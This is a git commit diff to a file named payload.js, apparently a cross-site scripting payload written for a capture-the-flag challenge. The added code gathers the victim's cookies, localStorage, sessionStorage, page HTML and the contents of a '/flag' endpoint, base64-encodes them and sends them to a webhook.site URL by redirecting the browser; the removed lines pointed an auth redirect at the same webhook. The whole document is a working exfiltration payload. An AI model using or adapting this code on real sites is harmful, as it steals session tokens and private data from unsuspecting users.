d7bb1beec955fe97ab64d592e786b24975ef7bd3
t3igger <127245898+t3igger@users.noreply.github.com>
2026-03-16 13:52:21 +0100

    Refactor payload.js to collect and send data
    Removed authConfig and added data collection for cookies, localStorage, sessionStorage, and HTML content.

--- payload.js
+++ payload.js
@@ -1,7 +1,17 @@
-window.authConfig = {
-  dataset: {
-    next: 'https://webhook.site/4d8f3d85-deb0-4276-b244-661f50adb47f',
-    append: 'true'
-  }
+(async () => {
+
+let data = {
+    cookie: document.cookie,
+    localStorage: JSON.stringify(localStorage),
+    sessionStorage: JSON.stringify(sessionStorage),
+    html: document.documentElement.innerHTML
 };
-window.Auth.loginRedirect();
+
+try {
+    let r = await fetch("/flag");
+    data.flag_endpoint = await r.text();
+} catch(e){}
+
+location = "https://webhook.site/4d8f3d85-deb0-4276-b244-661f50adb47f/?" + btoa(JSON.stringify(data));
+
+})();
